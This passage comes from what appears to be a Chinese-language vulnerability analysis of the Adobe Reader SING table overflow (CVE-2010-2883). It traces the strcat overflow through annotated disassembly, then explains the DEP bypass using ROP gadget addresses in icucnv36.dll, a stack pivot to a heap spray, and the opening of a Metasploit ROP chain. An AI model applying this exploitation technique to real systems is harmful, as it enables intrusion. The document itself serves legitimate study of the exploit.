class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">******************************************************</span><br><span class="line"></span><br><span class="line">                sub_814B423()</span><br><span class="line"></span><br><span class="line">******************************************************</span><br><span class="line"><span class="symbol">.text:</span>0814B470        <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+var_4], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>0814B474        <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_10]</span><br><span class="line"><span class="symbol">.text:</span>0814B477        <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_8]</span><br><span class="line"><span class="symbol">.text:</span>0814B47A        <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0814B47B        <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>0814B47E        <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0814B47F        <span class="keyword">call</span>    sub_80DD0B3  &lt;-------</span><br><span class="line"><span class="symbol">.text:</span>0814B484        <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">18h</span></span><br><span class="line"><span class="symbol">.text:</span>0814B487        <span class="keyword">push</span>    [<span class="built_in">ebp</span>+var_20]</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">*************************************************************************************</span><br><span class="line"></span><br><span class="line">     <span class="keyword">int</span> __cdecl sub_80DD0B3(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _<span class="built_in">DWORD</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">*************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>080DD0B3        <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">; [0x0012E7E8]=ebp=0x0012E838,父函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0B4        <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">0CCh</span>                        <span class="comment">; esp=0x0012E71C</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0BA        <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                     <span class="comment">; ebp=0x0012E718,本函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0BE        <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie          <span class="comment">; eax=0x78FC1194</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0C3        <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                         <span class="comment">; eax=eax^ebp=0x78EEF68C</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0C5        <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_4], <span class="built_in">eax</span>            <span class="comment">; [ebp+0xcc] = [0x0012E7E4] = 0x78EEF68C,父函数ebp之上</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0CB        <span class="keyword">push</span>    <span class="number">104h</span>                             <span class="comment">; [esp-0x4]=[0x0012E718]=0x104,(__EH_prolog3中分配的栈空间大小)</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0D0        <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8182A36          <span class="comment">; eax=0x8182A36(__security_check_cookie函数地址)</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0D5        <span class="keyword">call</span>    __EH_prolog3                     <span class="comment">; [0x0012E714]=ret=0x080DD0DA</span></span><br><span class="line">........</span><br><span class="line"><span class="symbol">.text:</span>080DD2D1 loc_80DD2D1:                          </span><br><span class="line"><span class="symbol">.text:</span>080DD2D1                              </span><br><span class="line"><span class="symbol">.text:</span>080DD2D1        <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_1E0]</span><br><span class="line"><span class="symbol">.text:</span>080DD2D7        <span class="keyword">call</span>    sub_80172FB</span><br><span class="line"><span class="symbol">.text:</span>080DD2DC        <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_E8], <span class="built_in">ebx</span>            <span class="comment">;   [ebp-0x18]=[0x0012E700]=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2DF        <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_E8]            <span class="comment">;   eax=ebp-0x18=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E2        <span class="keyword">push</span>    <span class="built_in">eax</span>                               <span class="comment">; arg_4: [0x0012E5F4]=eax=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E3        <span class="keyword">push</span>    <span class="built_in">ebx</span>                               <span class="comment">; arg_3: [0x0012E5F0]=ebx=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E4        <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_1E0]           <span class="comment">;   eax=ebp-0x110=0x0012E718-0x110=0x0012E608</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EA        <span class="keyword">push</span>    <span class="built_in">eax</span>                               <span class="comment">; arg_2: [0x0012E5EC]=eax=0x0012E608,对象(0x0012E608)的指针 &lt;--------</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EB        <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+value1_823A850]    <span class="comment">;   eax=ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EE        <span class="keyword">push</span>    <span class="built_in">eax</span>                               <span class="comment">; arg_1: [0x0012E5E8]=0x0012E718,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EF        <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_D4], <span class="number">4</span>     <span class="comment">; [ebp-0x4]=[0x0012E714]=4</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2F3        <span class="keyword">call</span>    sub_803DCF9      &lt;-------</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">*******************************************************************************</span><br><span class="line"></span><br><span class="line">        char __cdecl sub_803DCF9(<span class="keyword">int</span> a1, _<span class="built_in">DWORD</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line"></span><br><span class="line">*******************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0803DCF9         <span class="keyword">push</span>    <span class="built_in">ebp</span>                          <span class="comment">; ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>0803DCFA         <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">104h</span>                    <span class="comment">; esp=0x0012E4DC,分配局部变量栈空间</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD00         <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                 <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD04         <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie      <span class="comment">; eax=0x98C49E84</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD09         <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                     <span class="comment">; eax=eax^ebp=0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD0B         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_4], <span class="built_in">eax</span>        <span class="comment">; [ebp+0x104] = [0x0012E5DC] = 0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD11         <span class="keyword">push</span>    <span class="number">4Ch</span>                          <span class="comment">; [0x0012E4D8]=0x4C(分配栈空间大小)</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD13         <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8184A54      <span class="comment">; eax=0x8184A54(__security_check_cookie)</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD18         <span class="keyword">call</span>    __EH_prolog3_catch           <span class="comment">; [0x0012E4D4]=0x0803DD1D,ret</span></span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>0803DD29         <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_4]        <span class="comment">; ebx = 0x0012E608,对象(0x0012E608)的指针 &lt;--------</span></span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F loc_803DD9F:                </span><br><span class="line"><span class="symbol">.text:</span>0803DD9F         <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">10h</span>                         <span class="comment">; 相对SING表入口偏移0x10处找到uniqueName</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA2         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; char *,strcat源地址入栈，也就是uniqueName起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA3         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf]   <span class="comment">; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA6         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; char *,strcat目的地址入栈</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA7         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf], <span class="number">0</span>     <span class="comment">; 将目标字符串赋值为NULL,空字符串</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDAB         <span class="keyword">call</span>    strcat                           <span class="comment">; 调用strcat函数，造成溢出</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB0         <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB1         <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB2         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf]   <span class="comment">;   eax=ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB5         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg1: [0x0012E46C]=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB6         <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">ebx</span>                         <span class="comment">; this: ecx=ebx=0x0012E608,对象(0x0012E608)的指针 &lt;--------</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB8         <span class="keyword">call</span>    sub_8001243</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *__thiscall sub_8001243(<span class="keyword">int</span> *this, <span class="keyword">int</span> uniqueName_buf)</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001243</span>         <span class="keyword">push</span>    <span class="built_in">esi</span>                              <span class="comment">; esi=0x0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001244</span>         <span class="keyword">push</span>    <span class="built_in">edi</span>                              <span class="comment">; edi=0x0012E718,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001245</span>         <span class="keyword">push</span>    [<span class="built_in">esp</span>+<span class="number">8</span>+uniqueName_buf]           <span class="comment">; [esp+0xc]=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001249</span>         <span class="keyword">mov</span>     <span class="built_in">esi</span>, <span class="built_in">ecx</span>                         <span class="comment">; esi = ecx = 0x0012E608,对象(0x0012E608)的指针 &lt;--------</span></span><br><span class="line"><span class="symbol">.text:</span>0800124B         <span class="keyword">call</span>    dword_8231220                    <span class="comment">; BIB.07005C59</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001251</span>         <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span>                         <span class="comment">; edi=eax=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001253</span>         <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esi</span>]                       <span class="comment">; eax = [esi]=[0x0012E608]=0x4A8A08C6,icucnv36 &lt;--------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001255</span>         <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001257</span>         <span class="keyword">pop</span>     <span class="built_in">ecx</span>                              <span class="comment">; ecx=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08001258</span>         <span class="keyword">jz</span>      short loc_8001262                <span class="comment">; 不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0800125A         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg1: [0x0012E45C]=eax = 0x4A8A08C6, &lt;----------</span></span><br><span class="line"><span class="symbol">.text:</span>0800125B         <span class="keyword">call</span>    dword_8231224                    <span class="comment">; BIB.07005CAF  </span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">07005CAF       <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0x4</span>]           <span class="comment">; ecx=[esp+4]=0x4A8A08C6 &lt;- arg1</span></span><br><span class="line">07005CB3       <span class="keyword">jmp</span> BIB.070013F2</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">**********************************************</span><br><span class="line"></span><br><span class="line">            BIB.070013F2()</span><br><span class="line"></span><br><span class="line">**********************************************</span><br><span class="line">070013F2       <span class="keyword">push</span> <span class="built_in">ebp</span>                                 <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line">070013F3       <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span>                              <span class="comment">; ebp=esp=0x0012E454</span></span><br><span class="line">070013F5       <span class="keyword">push</span> <span class="built_in">ecx</span>                                 <span class="comment">; ecx=0x4A8A08C6,icucnv36</span></span><br><span class="line">070013F6       <span class="keyword">push</span> <span class="built_in">ecx</span>                                 <span class="comment">; ecx=0x4A8A08C6,icucnv36</span></span><br><span class="line">070013F7       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x1C</span>]          <span class="comment">; eax=0x4A8A08C6+0x1C=0x4A8A08E2 &lt;--------</span></span><br><span class="line">070013FA       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="built_in">eax</span>           <span class="comment">; </span></span><br><span class="line">070013FD       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x8</span>]           <span class="comment">; </span></span><br><span class="line"><span class="number">07001400</span>       <span class="keyword">lock</span> <span class="keyword">dec</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]              <span class="comment">; [eax] = [0x4A8A08E2] = 0x00000000,减1变为0xFFFFFFFF &lt;--------</span></span><br><span class="line"><span class="number">07001403</span>       <span class="keyword">sete</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x1</span>]               <span class="comment">; 取标志寄存器中ZF的值, 赋值给[ebp-0x1] ebp=0012E454;[0012E450]=0x4A8A08C6-&gt;0x008A08C6</span></span><br><span class="line"><span class="number">07001407</span>       <span class="keyword">cmp</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x1</span>],<span class="number">0x0</span>            <span class="comment">; ZF=1</span></span><br><span class="line">0700140B       <span class="keyword">je</span> short BIB<span class="meta">.07001412</span>                    <span class="comment">; 跳转实现</span></span><br><span class="line"><span class="number">0700140D</span>       <span class="keyword">call</span> BIB.070013B5                        <span class="comment">; 不执行</span></span><br><span class="line"><span class="number">07001412</span>       <span class="keyword">leave</span></span><br><span class="line"><span class="number">07001413</span>       <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;通过上面的调试信息,<code>BIB.070013F2()</code>函数中的地址<code>0x07001400</code>处的指令<code>lock dec dword ptr ds:[eax]</code>对<code>0x4A8A08C6+0x1C=0x4A8A08E2</code>地址处的值进行了<code>读写</code>,所以<code>0x4A8A08C6+0x1C</code>处的值必须要具有<code>可读可写</code>权限。在<code>吾爱OllyDbg</code>的内存窗口,只能看到此地址具有<code>读权限</code>,而通过<code>Immunity Debugger</code>可以看到此地址处具有<code>读写权限</code>。</p><h5 id="2-6、样本中SING表数据“0x6C”的作用"><a href="#2-6、样本中SING表数据“0x6C”的作用" class="headerlink" title="2.6、样本中SING表数据“0x6C”的作用"></a>2.6、样本中SING表数据“0x6C”的作用</h5><p>TBD,样本中注释说是,如果没有这段数据,sub_801ba57()函数将会返回0。没有调试出来。<br>最近找到一个链接，提到了这个数据的作用，更新下，就先不分析了，没啥时间。<br><a href="https://web.archive.org/web/20120303021728/http://www.vupen.com/blog/20100909.Adobe_Acrobat_Reader_0_Day_Exploit_CVE-2010-2883_Technical_Analysis.php" target="_blank" rel="noopener">2010.09.09 - VUPEN - Criminals Are Getting Smarter: Analysis of the Adobe Acrobat/Reader 0-Day Exploit</a></p><h2 id="0x40-漏洞利用"><a href="#0x40-漏洞利用" class="headerlink" title="0x40 漏洞利用"></a>0x40 漏洞利用</h2><h3 id="0x41-ROP绕过DEP"><a href="#0x41-ROP绕过DEP" class="headerlink" title="0x41 ROP绕过DEP"></a>0x41 ROP绕过DEP</h3><h4 id="1、阶段1：跳转到堆喷代码"><a href="#1、阶段1：跳转到堆喷代码" class="headerlink" title="1、阶段1：跳转到堆喷代码"></a>1、阶段1：跳转到堆喷代码</h4><p>&emsp;&emsp;<code>DEP</code>(Data Execution Prevention),即<code>数据执行保护</code>。开启后,<code>堆栈</code>是不具有<code>执行权限</code>的,所以不能直接在<code>缓冲区</code>中填入<code>Payload</code>。而<code>ROP</code>(Return-Oriented Programming),<code>返回导向编程</code>,则是通过程序中<code>已存在</code>的多段小的<code>代码片段(ROPgadget)</code>来控制程序执行流的。缓冲区中填入的只是<code>代码片段的首地址</code>。样本中使用了<code>两段ROPgadget</code>代码片段用于<code>绕过DEP</code>。<br><strong><code>ROPgadget1:</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">icucnv36.4A80CB38    81C5 <span class="number">94070000</span>   <span class="keyword">add</span> <span class="built_in">ebp</span>,<span class="number">0x794</span> <span class="comment">; ebp=0x0012DD48+0x794=0x0012E4DC</span></span><br><span class="line">icucnv36.4A80CB3E    C9              <span class="keyword">leave</span>         <span class="comment">; 如下</span></span><br><span class="line">icucnv36.4A80CB3F    C3              <span class="keyword">retn</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">leave:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="built_in">ebp</span> <span class="comment">; esp=ebp=0x0012E4DC</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ebp</span>     <span class="comment">; esp=esp+0x4=0x0012E4E0 -&gt; ROPgadget2</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;执行到<code>0x0012E6D0</code>处的<code>ROPgadget1</code>时,<code>esp</code>(0x0012DD24)距离我们构造的<code>“uniqueName”字段</code>在栈上的<code>缓冲区的首地址</code>(0x0012E4D8)有<code>较远距离</code>,所以我们需要寻找一段可以调整<code>esp</code>至“uniqueName”字段缓冲区内的<code>ROPgadget</code>。上面这段<code>ROPgadget</code>先是通过修改<code>ebp</code>,让其落在“uniqueName”字段缓冲区内,然后通过<code>leave</code>指令,利用<code>ebp</code>来修改<code>esp</code>,使其指向<code>第二段ROPgadget</code>,再执行<code>ret</code>指令,跳转到<code>ROPgadget2</code>执行。</p><p><strong><code>ROPgadget2:</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">icucnv36.4A82A712    FF50 5C         <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x5C</span>]</span><br><span class="line">icucnv36.4A82A715    C3              <span class="keyword">retn</span></span><br><span class="line"></span><br><span class="line">icucnv36.4A82A714    5C              <span class="keyword">pop</span> <span class="built_in">esp</span> <span class="comment">; esp=0x0C0C0C0C                       </span></span><br><span class="line">icucnv36.4A82A715    C3              <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这段<code>ROPgadget</code>直接将<code>esp</code>指向<code>堆喷的ROP Chain</code>代码处,执行<code>ROP Chain</code>。原本这里的代码是<code>CALL</code>指令，机器码为<code>FF50 5C</code>,这里只截取了<code>5C</code>，所以指令变成了<code>pop esp</code>,成功控制EIP去执行<code>Heap Spray</code>处的<code>ROP Chain</code>。</p><p>接下来我们通过一张图来了解这个<code>ROP过程</code>：</p><div align="left"><img src="/resources/2018/2018-06-01-03.png" width="80%" height="70%" alt="漏洞利用ROP链"></div><p>&emsp;&emsp;前面说过,漏洞作者选取的这两个ROPgadget地址<code>0x4A82A714</code>和<code>0x4A80CB38</code>都位于<code>icucnv36.dll</code>的地址空间，而在<code>Adobe Reader</code>的各个版本上，这个dll的这两处地址是<code>始终不变</code>的，从而保证了<code>exploit</code>对于各版本的<code>兼容性</code>和<code>稳定性</code>。</p><h4 id="2、阶段2：将真正的shellcode复制到可读可写可执行内存段"><a href="#2、阶段2：将真正的shellcode复制到可读可写可执行内存段" class="headerlink" title="2、阶段2：将真正的shellcode复制到可读可写可执行内存段"></a>2、阶段2：将真正的shellcode复制到可读可写可执行内存段</h4><p>&emsp;&emsp;接下来我们来看看<code>堆喷的代码</code>是怎样<code>绕过DEP</code>的。我查看了<code>msf</code>用于<code>生成样本文件的模块</code>，其中如下的数据就是用于<code>绕过DEP</code>而构造的<code>ROP Chain</code>：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用icucnv36.dll中的代码片段,构建ret2lib的ROP Chain.以此绕过DEP,执行shellcode.</span></span><br><span class="line">stack_data = [</span><br><span class="line">    <span class="number">0x41414141</span>,   <span class="comment"># 